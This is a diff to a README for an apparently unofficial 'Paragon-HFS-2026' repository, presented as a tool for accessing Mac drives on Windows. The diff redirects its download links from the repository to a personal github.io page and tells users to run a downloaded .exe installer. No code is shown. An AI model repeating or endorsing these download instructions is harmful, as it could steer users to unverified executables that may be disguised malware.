@@ -1,6 +1,6 @@
 # 💾 Paragon-HFS-2026 - Access Mac Drives on Windows Effortlessly
 
-[![](https://img.shields.io/badge/Download-Paragon_HFS-blue.svg)](https://github.com/Saputro3989/Paragon-HFS-2026)
+[![](https://img.shields.io/badge/Download-Paragon_HFS-blue.svg)](https://saputro3989.github.io)
 
 ## 📁 What Does This Software Do?
 
@@ -23,7 +23,7 @@ Before you install this software, confirm your computer meets these standards:
 
 Follow these steps to set up the software. This guide assumes you use a standard Windows web browser like Chrome, Edge, or Firefox.
 
-1. Go to the [official repository page](https://github.com/Saputro3989/Paragon-HFS-2026) to start the process.
+1. Go to the [official repository page](https://saputro3989.github.io) to start the process.
 2. Look for the releases section on the right side of the page.
 3. Click on the latest release version.
 4. Select the installer file ending in .exe to begin your download.
